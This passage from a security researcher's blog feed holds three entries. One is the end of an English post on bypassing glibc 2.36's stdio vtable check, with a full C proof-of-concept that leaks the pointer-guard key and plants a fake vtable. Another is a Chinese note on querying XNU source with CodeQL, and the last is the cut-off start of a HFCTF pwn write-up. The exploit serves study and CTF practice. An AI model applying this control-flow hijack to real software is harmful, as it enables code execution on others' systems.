class="keyword">if</span> (!rtld_active ()</span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We can notice that it does give us a chance to use another foreign vtable. Now the question becomes how can we bypass the checking here.</p><p>Let’s take a look at</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!rtld_active ()</span><br><span class="line">    || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">        &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">  <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><p>First, <code>!rtlf_active()</code> seems a great choice. But the value it returns is based on a value in read-only memory. Then what about <code>_dl_addr (_IO_vtable_check, &amp;di, &amp;l, NULL) != 0</code>? This line is performed to check the ld namespace of a given address. To bypass it we are required to construct a really complex linker-related structure. So let’s check the very first <code>flag</code> checking.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="keyword">void</span> (*flag) (<span class="keyword">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><p><code>_IO_check_vtable</code> will load <code>IO_accept_foreign_vtables</code> and compare it against with <code>_IO_vtable_check</code> and luckily <code>IO_accept_foreign_vtables</code> is writable! So the problem is how can we defeat the <code>PTR_MANGLE</code> stuff.</p><h2 id="Defeat-PTR-MAGLE">Defeat <code>PTR_MAGLE</code></h2><p>Pointer guard is used to proctect some critical pointers from being forged. We can use the following pseudocode to compute a <code>PTR_MANGLE</code>d pointer value.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rol(ptr ^ pointer_guard, <span class="number">0x11</span>)</span><br></pre></td></tr></table></figure><p>to demangle we can just</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ror(ptr, <span class="number">0x11</span>) ^ pointer_guard</span><br></pre></td></tr></table></figure><p>Now the problem becomes how can we leak or overwrite the pointer_guard.</p><p>Pointer guard is located in TLS structure. Although we do have method to modify the value, but why not ROP directly when we have this kind of primitive. So let’s take a look at how to leak pointer guard.</p><p>We have two ways to do so. Directly leak them from TLS or leak a mangled pointer and then calculate the pointer_guard xor key.</p><p>Leaking from TLS requires us to leak TLS address first so we will focu on the second method here.</p><p>Fortunately we do have a mangled pointer! Consider the following code.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __fastcall __noreturn _libc_start_main(</span><br><span class="line">        <span class="keyword">int</span> (__fastcall *main)(<span class="keyword">int</span>, <span class="keyword">char</span> **, <span class="keyword">char</span> **),</span><br><span class="line">        <span class="keyword">int</span> argc,</span><br><span class="line">        <span class="keyword">char</span> **ubp_av,</span><br><span class="line">        <span class="keyword">void</span> (*init)(<span class="keyword">void</span>),</span><br><span class="line">        <span class="keyword">void</span> (*fini)(<span class="keyword">void</span>),</span><br><span class="line">        <span class="keyword">void</span> (*rtld_fini)(<span class="keyword">void</span>),</span><br><span class="line">        <span class="keyword">void</span> *stack_end)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> **v12; <span class="comment">// rdx</span></span><br><span class="line">  _QWORD *v13; <span class="comment">// r14</span></span><br><span class="line">  __int64 v14; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v15; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">void</span> (__fastcall **v16)(_QWORD, <span class="keyword">char</span> **, <span class="keyword">char</span> **, _QWORD, <span class="keyword">void</span> (*)(<span class="keyword">void</span>)); <span class="comment">// rcx</span></span><br><span class="line">  __int64 v17; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">void</span> (__fastcall **v18)(_QWORD, <span class="keyword">char</span> **, <span class="keyword">char</span> **, _QWORD, <span class="keyword">void</span> (*)(<span class="keyword">void</span>)); <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">char</span> **v19; <span class="comment">// [rsp+0h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> **v20; <span class="comment">// [rsp+0h] [rbp-48h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+8h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( rtld_fini )</span><br><span class="line">    _cxa_atexit(rtld_fini, <span class="number">0LL</span>, <span class="number">0LL</span>, init, fini);</span><br></pre></td></tr></table></figure><p>When calling <code>_cxa_atexit</code>, <code>rdi==_dl_fini</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__GI___cxa_atexit (</span><br><span class="line">   QWORD var_0 = 0x007ffff7fceaa0 → &lt;_dl_fini+0&gt; push rbp,</span><br><span class="line">   QWORD var_1 = 0x00000000000000,</span><br><span class="line">   QWORD var_2 = 0x00000000000000</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><code>_cxa_atexit</code> will then register the function to <code>_exit_function</code> after mangling!</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__internal_atexit (<span class="keyword">void</span> (*func) (<span class="keyword">void</span> *), <span class="keyword">void</span> *arg, <span class="keyword">void</span> *d,</span><br><span class="line">   struct exit_function_list **listp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* As a QoI issue we detect NULL early with an assertion instead</span></span><br><span class="line"><span class="comment">     of a SIGSEGV at program exit when the handler is run (bug 20544).  */</span></span><br><span class="line">  assert (func != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">  <span class="keyword">new</span> = __new_exitfn (listp);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">new</span> == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_MANGLE</span></span><br><span class="line">  PTR_MANGLE (func);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">new</span>-&gt;func.cxa.fn = (<span class="keyword">void</span> (*) (<span class="keyword">void</span> *, <span class="keyword">int</span>)) func;</span><br><span class="line">  <span class="keyword">new</span>-&gt;func.cxa.arg = arg;</span><br><span class="line">  <span class="keyword">new</span>-&gt;func.cxa.dso_handle = d;</span><br><span class="line">  <span class="keyword">new</span>-&gt;flavor = ef_cxa;</span><br><span class="line">  __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So leaking <code>_dl_fini</code> in <code>_exit_function</code> means leaking xor key now. Then override <code>IO_accepte_foreign_vtable</code> with a mangled <code>_IO_vtable_check</code> pointer, we are able to use any vtable to completely take over the control flow.</p><p>Here is an example.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">u_int64_t</span> <span class="title">ror</span><span class="params">(<span class="keyword">u_int64_t</span> n, <span class="keyword">unsigned</span> <span class="keyword">int</span> d)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (n &gt;&gt; d) | (n &lt;&lt; (<span class="number">64</span> - d));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">u_int64_t</span> <span class="title">rol</span><span class="params">(<span class="keyword">u_int64_t</span> n, <span class="keyword">unsigned</span> <span class="keyword">int</span> d)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (n &lt;&lt; d) | (n &gt;&gt; (<span class="number">64</span> - d));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pwn</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;echo fake_vtable&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;touch pwn&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">u_int64_t</span> libcbase = ((<span class="keyword">u_int64_t</span>)&amp;<span class="built_in">free</span> - <span class="number">0xa5460</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libcbase 0x%llx\n&quot;</span>, libcbase);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] get encoded _dl_fini pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">u_int64_t</span> dlfini = *(<span class="keyword">u_int64_t</span> *)(libcbase + <span class="number">0x21af18</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _dl_fini: 0x%llx\n&quot;</span>, dlfini);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] get xor key\n&quot;</span>);</span><br><span class="line">    dlfini = ror(dlfini, <span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">u_int64_t</span> key = dlfini ^ (libcbase + <span class="number">0x409040</span>); <span class="comment">// real _dl_fini, in ld.so actually </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] got xor key 0x%llx\n&quot;</span>, key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">u_int64_t</span> iotablecheck = libcbase + <span class="number">0x89f70</span>;</span><br><span class="line">    <span class="keyword">u_int64_t</span> encoded_io_table_check = rol(iotablecheck^key, <span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">u_int64_t</span> IO_accept_foreign_vtables = libcbase + <span class="number">0x21ba28</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] override flag\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">u_int64_t</span>*)IO_accept_foreign_vtables = encoded_io_table_check;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *fake_vtable = <span class="built_in">malloc</span>(<span class="number">0x8</span>*<span class="number">0x50</span>);</span><br><span class="line">    <span class="built_in">memset</span>(fake_vtable, <span class="number">0x41</span>, <span class="number">0x8</span>*<span class="number">0x50</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">u_int64_t</span> *)((<span class="keyword">u_int64_t</span>)(<span class="built_in">stdout</span>) + <span class="number">0xd8</span>) = (<span class="keyword">u_int64_t</span>)fake_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x50</span><span class="number">-2</span>; ++i) ((<span class="keyword">u_int64_t</span> *)fake_vtable)[i+<span class="number">2</span>] = &amp;pwn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Run the example with a simple script</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: glibc detected an invalid stdio handle</span><br><span class="line">Fatal error: glibc detected an invalid stdio handle</span><br><span class="line">Fatal error: glibc detected an invalid stdio handle</span><br><span class="line">pwn!!!</span><br><span class="line">pwn after 234 attempts</span><br></pre></td></tr></table></figure><h2 id="Conclusion">Conclusion</h2><p>The offset between libc and ld is not a constant value so we need to bruteforce the <code>_dl_fini</code> here since it’s in ld.<br>With a ld leaking the exploitation can be more reliable. And I will show a much more reliable way to exploit in next chapter.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Code Execution by Faking IO_FILE-&amp;gt;vtable in GLIBC 2.36 [0x0]&lt;/h1&gt;
&lt;p&gt;Since vtables were added to a specific read-only segment in GLIB</summary>
      
    
    
    
    
    <category term="Vulnerability" scheme="https://kpwnz.github.io/tags/Vulnerability/"/>
    
    <category term="PWN" scheme="https://kpwnz.github.io/tags/PWN/"/>
    
    <category term="CTF" scheme="https://kpwnz.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL+XNU</title>
    <link href="https://kpwnz.github.io/2022/07/11/CodeQL-XNU/"/>
    <id>https://kpwnz.github.io/2022/07/11/CodeQL-XNU/</id>
    <published>2022-07-12T00:53:41.000Z</published>
    <updated>2022-07-11T13:28:00.290Z</updated>
    
    <content type="html"><![CDATA[<p>入门浅试记录一下，文档还没看完</p><h2 id="安装">安装</h2><p>下载压缩包解压到一个位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:&lt;codeql_path&gt;</span><br></pre></td></tr></table></figure><h2 id="建立XNU-database">建立XNU database</h2><p>cd 进xnu源码的存放位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create xnu-database --language=cpp --command=&quot;make SDKROOT=macosx ARCH_CONFIGS=X86_64 KERNEL_CONFIGS=RELEASE&quot;</span><br></pre></td></tr></table></figure><h2 id="查询测试">查询测试</h2><p>首先建立一个CodeQL package</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql pack init xnuql -e cpp</span><br></pre></td></tr></table></figure><p>然后添加cpp-all</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd xnuql</span><br><span class="line">codeql pack add codeql/cpp-all</span><br></pre></td></tr></table></figure><p>在package里新建一个ql文件，配合vscode的CodeQL插件就可以简单进行查询，来进行一点简单的测试先，参考<a href="https://o0xmuhe.github.io/2021/07/11/ql-query-for-CVE-2021-30660-XNU-Kernel-Memory-Disclosure/">这篇文章</a></p><p>可以查询到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sopt.sopt_dir = SOPT_GET;</span><br><span class="line">sopt.sopt_level = uap-&gt;level;</span><br><span class="line">sopt.sopt_name = uap-&gt;name;</span><br><span class="line">sopt.sopt_val = uap-&gt;val;</span><br><span class="line">sopt.sopt_valsize = (<span class="keyword">size_t</span>)valsize; <span class="comment">/* checked non-negative above */</span></span><br><span class="line">sopt.sopt_p = p;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (so == <span class="literal">NULL</span>) &#123;</span><br><span class="line">error = EBADF;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> CONFIG_MACF_SOCKET_SUBSET</span></span><br><span class="line"><span class="keyword">if</span> ((error = mac_socket_check_getsockopt(kauth_cred_get(), so,</span><br><span class="line">    &amp;sopt)) != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* MAC_SOCKET_SUBSET */</span></span></span><br><span class="line">error = sogetoptlock((struct socket *)so, &amp;sopt, <span class="number">1</span>);    <span class="comment">/* will lock */</span></span><br><span class="line"><span class="keyword">if</span> (error == <span class="number">0</span>) &#123;</span><br><span class="line">valsize = (<span class="keyword">socklen_t</span>)sopt.sopt_valsize;</span><br><span class="line">error = copyout((<span class="keyword">caddr_t</span>)&amp;valsize, uap-&gt;avalsize,</span><br><span class="line">    <span class="keyword">sizeof</span>(valsize));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>sogetoptlock()</code>有一条路径即使错误也不会设置错误返回值，然而<code>copyout()</code>的第三个参数实际上是个<code>sizeof</code>，事实上查看查询结果，有很多误报<code>sizeof</code>的结果，可能是由于AST里还是有<code>sizeof(arg)</code>在的原因吧。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;入门浅试记录一下，文档还没看完&lt;/p&gt;
&lt;h2 id=&quot;安装&quot;&gt;安装&lt;/h2&gt;
&lt;p&gt;下载压缩包解压到一个位置&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span </summary>
      
    
    
    
    
    <category term="Vulnerability" scheme="https://kpwnz.github.io/tags/Vulnerability/"/>
    
    <category term="XNU" scheme="https://kpwnz.github.io/tags/XNU/"/>
    
    <category term="macOS" scheme="https://kpwnz.github.io/tags/macOS/"/>
    
  </entry>
  
  <entry>
    <title>虎符2022 pwn 复现</title>
    <link href="https://kpwnz.github.io/2022/03/23/%E8%99%8E%E7%AC%A62022-pwn-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://kpwnz.github.io/2022/03/23/%E8%99%8E%E7%AC%A62022-pwn-%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-03-23T18:38:08.000Z</published>
    <updated>2022-04-12T03:09:14.376Z</updated>
    
    <content type="html"><![CDATA[<h1>HFCTF</h1><p>没空去结束了之后简单做了一下pwn</p><!-- TOC --><ul><li><a href="#hfctf">HFCTF</a><ul><li><a href="#gogogo">gogogo</a></li><li><a href="#hfdev">hfdev</a></li><li><a href="#babygame">babygame</a></li><li><a href="#vdq">vdq</a></li><li><a href="#mva">mva</a></li></ul></li></ul><!-- /TOC --><h2 id="gogogo">gogogo</h2><p>go写的，不太会分析，首先运行起来，搜索 <code>LET'S BEGIN TO PLAY A GUESS GAME IN HFCTF!</code> 能找到 <code>main_main</code> 但是断点下来没有用，搜了一下一个go程序的启动过程</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The main goroutine.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">g := getg()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Racectx of m0-&gt;g0 is used only as the parent of the main goroutine.</span></span><br><span class="line"><span class="comment">// It must not be used for anything else.</span></span><br><span class="line">g.m.g0.racectx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Max stack size is 1 GB on 64-bit, 250 MB on 32-bit.</span></span><br><span class="line"><span class="comment">// Using decimal instead of binary GB and MB because</span></span><br><span class="line"><span class="comment">// they look nicer in the stack overflow failure message.</span></span><br><span class="line"><span class="keyword">if</span> goarch.PtrSize == <span class="number">8</span> &#123;</span><br><span class="line">maxstacksize = <span class="number">1000000000</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">maxstacksize = <span class="number">250000000</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// An upper limit for max stack size. Used to avoid random crashes</span></span><br><span class="line"><span class="comment">// after calling SetMaxStack and trying to allocate a stack that is too big,</span></span><br><span class="line"><span class="comment">// since stackalloc works with 32-bit sizes.</span></span><br><span class="line">maxstackceiling = <span class="number">2</span> * maxstacksize</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allow newproc to start new Ms.</span></span><br><span class="line">mainStarted = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> GOARCH != <span class="string">&quot;wasm&quot;</span> &#123; <span class="comment">// no threads on wasm yet, so no sysmon</span></span><br><span class="line">systemstack(<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">newm(sysmon, <span class="literal">nil</span>, <span class="number">-1</span>)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Lock the main goroutine onto this, the main OS thread,</span></span><br><span class="line"><span class="comment">// during initialization. Most programs won&#x27;t care, but a few</span></span><br><span class="line"><span class="comment">// do require certain calls to be made by the main thread.</span></span><br><span class="line"><span class="comment">// Those can arrange for main.main to run in the main thread</span></span><br><span class="line"><span class="comment">// by calling runtime.LockOSThread during initialization</span></span><br><span class="line"><span class="comment">// to preserve the lock.</span></span><br><span class="line">lockOSThread()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> g.m != &amp;m0 &#123;</span><br><span class="line">throw(<span class="string">&quot;runtime.main not on m0&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Record when the world started.</span></span><br><span class="line"><span class="comment">// Must be before doInit for tracing init.</span></span><br><span class="line">runtimeInitTime = nanotime()</span><br><span class="line"><span class="keyword">if</span> runtimeInitTime == <span class="number">0</span> &#123;</span><br><span class="line">throw(<span class="string">&quot;nanotime returning zero&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug.inittrace != <span class="number">0</span> &#123;</span><br><span class="line">inittrace.id = getg().goid</span><br><span class="line">inittrace.active = <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">doInit(&amp;runtime_inittask) <span class="comment">// Must be before defer.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Defer unlock so that runtime.Goexit during init does the unlock too.</span></span><br><span class="line">needUnlock := <span class="literal">true</span></span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span 